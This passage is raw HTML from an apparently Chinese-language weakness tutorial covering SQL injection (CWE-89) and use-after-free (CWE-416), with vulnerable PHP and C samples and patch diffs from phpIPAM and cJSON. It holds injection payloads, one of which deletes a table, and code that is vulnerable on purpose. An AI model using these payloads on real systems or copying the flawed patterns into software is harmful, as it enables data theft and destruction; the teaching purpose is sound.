class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre style="background:linear-gradient(180deg, transparent 24px, var(--bg-transparent-red) 24px 48px, transparent 48px, transparent 48px, var(--bg-transparent-green) 48px 72px, transparent 72px)"><code><span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;td>'</span> <span class="token operator">.</span> <span class="token variable">$type</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;bdo dir="ltr">&lt;/bdo>&lt;/td>'</span><span class="token punctuation">;</span>
<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;td>'</span> <span class="token operator">.</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;bdo dir="ltr">&lt;/bdo>&lt;/td>'</span><span class="token punctuation">;</span>
</code></pre></div><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre style="background:linear-gradient(180deg, transparent 24px, var(--bg-transparent-red) 24px 48px, transparent 48px, transparent 48px, var(--bg-transparent-green) 48px 72px, transparent 72px)"><code><span class="token variable">$current_size</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pma_fontsize'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$current_size</span> <span class="token operator">=</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pma_fontsize'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div></div><h3 class="x-h2"><a href="https://cwe.mitre.org/data/definitions/89.html" target="_blank" rel="noreferrer">【B】CWE-89: Improper Neutralization of Special Elements used in an SQL Command (&#x27;SQL Injection&#x27;)</a></h3><p class="x-p">SQL注入，如果用户可控的输入没有被正确的过滤其中可能包含的SQL语法，那么用这部分输入作为完整SQL命令的一部分时，可能发生预期之外的结果。这可用于更改查询逻辑以绕过安全检查，或插入修改后端数据库的其他语句，包括执行系统命令。</p><h4 class="x-h3">Example 1</h4><p class="x-p">如果一个SQL由用户输入拼接而成，最终的大致示意如下，其中<code class="x-inline-highlight">userName</code>是用户名，<code class="x-inline-highlight">itemName</code>由用户输入：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Plain Text</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>SELECT * FROM items WHERE owner = &lt;userName> AND itemname = &lt;itemName>;</code></pre></div><p class="x-p">此时如果用户名<code class="x-inline-highlight">wiley</code>输入的<code class="x-inline-highlight">itemName</code>是<code class="x-inline-highlight">name' OR 'a'='a</code>，则拼接后的SQL语句是：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">SQL</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> items <span class="token keyword">WHERE</span> owner <span class="token operator">=</span> <span class="token string">'wiley'</span> <span class="token operator">AND</span> itemname <span class="token operator">=</span> <span class="token string">'name'</span> <span class="token operator">OR</span> <span class="token string">'a'</span><span class="token operator">=</span><span class="token string">'a'</span><span class="token punctuation">;</span></code></pre></div><p class="x-p">这条语句等价于：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">SQL</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> items<span class="token punctuation">;</span></code></pre></div><h4 class="x-h3">Example 2</h4><p class="x-p">还是上面的例子，这次假设用户<code class="x-inline-highlight">wiley</code>输入的<code class="x-inline-highlight">itemName</code>是<code class="x-inline-highlight">name'; DELETE FROM items; --</code>，则SQL语句等价于下面的两个请求：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">SQL</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> items <span class="token keyword">WHERE</span> owner <span class="token operator">=</span> <span class="token string">'wiley'</span> <span class="token operator">AND</span> itemname <span class="token operator">=</span> <span class="token string">'name'</span><span class="token punctuation">;</span>
<span class="token keyword">DELETE</span> <span class="token keyword">FROM</span> items<span class="token punctuation">;</span>
<span class="token comment">--'</span>
</code></pre></div><h4 class="x-h3">Example 3</h4><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"mid"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT MessageID, Subject FROM messages WHERE MessageID = '<span class="token interpolation"><span class="token variable">$id</span></span>'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p class="x-p">由于cookie是可以在本地修改的，这仍然是一个输入用户可控的例子。注意到PHP语句中的单引号包裹着<code class="x-inline-highlight">$id</code>，一个可以注入的载荷是<code class="x-inline-highlight">1432' or '1' = '1</code>。请求会变成：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">SQL</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">SELECT</span> MessageID<span class="token punctuation">,</span> Subject <span class="token keyword">FROM</span> messages <span class="token keyword">WHERE</span> MessageID <span class="token operator">=</span> <span class="token string">'1432'</span> <span class="token operator">or</span> <span class="token string">'1'</span> <span class="token operator">=</span> <span class="token string">'1'</span></code></pre></div><div class="x-highlightblock highlight-background-blue"><h4 class="x-h3">Example in real-world project</h4><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p>OpenCVE：<a href="https://www.opencve.io/cve/CVE-2018-1000869" target="_blank" rel="noreferrer" class="x-inline-link">CVE-2018-1000869</a></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">Exploit</code>：<a href="https://github.com/phpipam/phpipam/issues/2344" target="_blank" rel="noreferrer" class="x-inline-link">https://github.com/phpipam/phpipam/issues/2344</a></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">Patch</code>：<a href="https://github.com/phpipam/phpipam/commit/856b10ca85a24c04ed8651f4e13f867ec78a353d" target="_blank" rel="noreferrer" class="x-inline-link">https://github.com/phpipam/phpipam/commit/856b10ca85a24c04ed8651f4e13f867ec78a353d</a></p></div></div><p class="x-p">补丁中加入对参数合法性的检验：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre style="background:linear-gradient(180deg, transparent 96px, var(--bg-transparent-green) 96px 216px, transparent 216px)"><code><span class="token variable">$nat_id</span>   <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>               <span class="token comment">// nat id</span>
<span class="token variable">$nat_type</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>             <span class="token comment">// src, dst</span>

<span class="token comment">// validate object type</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$obj_type</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'subnets'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ipaddresses'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token variable">$Result</span><span class="token operator">-></span><span class="token function">show</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"danger"</span><span class="token punctuation">,</span> <span class="token function">_</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Invalid object type"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>

<span class="token comment">// validate object id</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$obj_id</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token variable">$Result</span><span class="token operator">-></span><span class="token function">show</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"danger"</span><span class="token punctuation">,</span> <span class="token function">_</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Invalid object id"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
</code></pre></div></div><h3 class="x-h2"><a href="https://cwe.mitre.org/data/definitions/416.html" target="_blank" rel="noreferrer">【V】CWE-416: Use After Free</a></h3><p class="x-p">使用释放过的指针可能会导致未知的行为发生。</p><h4 class="x-h3">Example 1</h4><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">C</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">BUFSIZER1</span> <span class="token expression"><span class="token number">512</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">BUFSIZER2</span> <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span>BUFSIZER1 <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span></span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>buf1R1<span class="token punctuation">;</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>buf2R1<span class="token punctuation">;</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>buf2R2<span class="token punctuation">;</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>buf3R2<span class="token punctuation">;</span>
    buf1R1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>BUFSIZER1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    buf2R1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>BUFSIZER1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>buf2R1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    buf2R2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>BUFSIZER2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    buf3R2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>BUFSIZER2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strncpy</span><span class="token punctuation">(</span>buf2R1<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> BUFSIZER1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>buf1R1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>buf2R2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>buf3R2<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p class="x-p"><code class="x-inline-highlight">buf2R1</code>已经被释放过了。</p><h4 class="x-h3">Example 2</h4><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">C</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">char</span> <span class="token operator">*</span>ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    abrt <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>abrt<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">logError</span><span class="token punctuation">(</span><span class="token string">"operation aborted before commit"</span><span class="token punctuation">,</span> ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p class="x-p">在发生异常时指针已经释放，但随后又在<code class="x-inline-highlight">logError</code>错误地使用。</p><div class="x-highlightblock highlight-background-blue"><h4 class="x-h3">Example in real-world project</h4><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p>OpenCVE：<a href="https://www.opencve.io/cve/CVE-2018-1000217" target="_blank" rel="noreferrer" class="x-inline-link">CVE-2018-1000217</a></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">Exploit</code>：<a href="https://github.com/DaveGamble/cJSON/issues/248" target="_blank" rel="noreferrer" class="x-inline-link">https://github.com/DaveGamble/cJSON/issues/248</a></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">Patch</code>：<a href="https://github.com/FSMaxB/cJSON/commit/22a7d04fa004462e0dca35c3cc7809bea38e65f9" target="_blank" rel="noreferrer" class="x-inline-link">https://github.com/FSMaxB/cJSON/commit/22a7d04fa004462e0dca35c3cc7809bea38e65f9</a></p></div></div><p class="x-p">如果<code class="x-inline-highlight">item</code>的<code class="x-inline-highlight">string</code>属性恰好就是<code class="x-inline-highlight">add_item_to_object</code>的<code class="x-inline-highlight">string</code>参数的地址，且<code class="x-inline-highlight">constant</code>为<code class="x-inline-highlight">false</code>，<code class="x-inline-highlight">cJSON_strdup</code>会在释放后访问这个字符串。</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">C</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre style="background:linear-gradient(180deg, transparent 72px, var(--bg-transparent-green) 72px 144px, transparent 144px, transparent 264px, var(--bg-transparent-red) 264px 384px, transparent 384px, transparent 432px, var(--bg-transparent-red) 432px 480px, transparent 480px, transparent 480px, var(--bg-transparent-green) 480px 528px, transparent 528px, transparent 600px, var(--bg-transparent-red) 600px 648px, transparent 648px, transparent 648px, var(--bg-transparent-green) 648px 696px, transparent 696px, transparent 792px, var(--bg-transparent-red) 792px 840px, transparent 840px, transparent 840px, var(--bg-transparent-green) 840px 864px, transparent 864px, transparent 912px, var(--bg-transparent-green) 912px 1104px, transparent 1104px)"><code><span class="token keyword">static</span> cJSON_bool <span class="token function">add_item_to_object</span><span class="token punctuation">(</span>cJSON <span class="token operator">*</span> <span class="token keyword">const</span> object<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span> <span class="token keyword">const</span> string<span class="token punctuation">,</span> cJSON <span class="token operator">*</span> <span class="token keyword">const</span> item<span class="token punctuation">,</span> <span class="token keyword">const</span> internal_hooks <span class="token operator">*</span> <span class="token keyword">const</span> hooks<span class="token punctuation">,</span> <span class="token keyword">const</span> cJSON_bool constant_key<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>new_key <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> new_type <span class="token operator">=</span> cJSON_Invalid<span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>object <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>string <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>item <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">return</span> false<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>item<span class="token operator">-></span>type <span class="token operator">&amp;</span> cJSON_StringIsConst<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>item<span class="token operator">-></span>string <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        hooks<span class="token operator">-></span><span class="token function">deallocate</span><span class="token punctuation">(</span>item<span class="token operator">-></span>string<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>constant_key<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        item<span class="token operator">-></span>string <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">cast_away_const</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">;</span>
        item<span class="token operator">-></span>type <span class="token operator">|=</span> cJSON_StringIsConst<span class="token punctuation">;</span>
        new_key <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">cast_away_const</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">;</span>
        new_type <span class="token operator">=</span> item<span class="token operator">-></span>type <span class="token operator">|</span> cJSON_StringIsConst<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">char</span> <span class="token operator">*</span>key <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">cJSON_strdup</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>string<span class="token punctuation">,</span> hooks<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
        new_key <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">cJSON_strdup</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>string<span class="token punctuation">,</span> hooks<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>new_key <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">return</span> false<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        item<span class="token operator">-></span>string <span class="token operator">=</span> key<span class="token punctuation">;</span>
        item<span class="token operator">-></span>type <span class="token operator">&amp;=</span> <span class="token operator">~</span>cJSON_StringIsConst<span class="token punctuation">;</span>
        new_type <span class="token operator">=</span> item<span class="token operator">-></span>type <span class="token operator">&amp;</span> <span class="token operator">~</span>cJSON_StringIsConst<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>item<span class="token operator">-></span>type <span class="token operator">&amp;</span> cJSON_StringIsConst<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>item<span class="token operator">-></span>string <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        hooks<span class="token operator">-></span><span class="token function">deallocate</span><span class="token punctuation">(</span>item<span class="token operator">-></span>string<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    item<span class="token operator">-></span>string <span class="token operator">=</span> new_key<span class="token punctuation">;</span>
    item<span class="token operator">-></span>type <span class="token operator">=</span> new_type<span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token function">add_item_to_array</span><span class="token punctuation">(</span>object<span class="token punctuation">,</span> item<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
